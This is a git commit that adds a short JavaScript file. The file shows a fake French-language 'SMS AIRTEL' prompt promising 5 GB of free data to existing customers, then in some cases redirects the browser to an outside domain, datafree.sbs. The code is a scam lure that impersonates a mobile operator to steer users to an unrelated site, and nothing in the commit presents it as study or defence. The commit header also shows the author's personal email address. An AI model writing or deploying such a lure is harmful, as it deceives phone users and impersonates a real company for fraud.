84a50cdc0d6fa93692e4c98e4d7002da93a57e0b
mmainomi <akparawa247@gmail.com>
2025-03-29 22:55:37 -0700

    Create activation-airtel-freedata.js

---
+++ activation-airtel-freedata.js
@@ -0,0 +1,5 @@
+var password = 'DONNÉES GRATUITES'
+password=prompt('SMS AIRTEL : Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir 5 Go de données illimitées, récompense pour les clients existants, appuyez sur Données gratuites pour vérifier maintenant ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://datafree.sbs/airtel-freedata.html';
+}
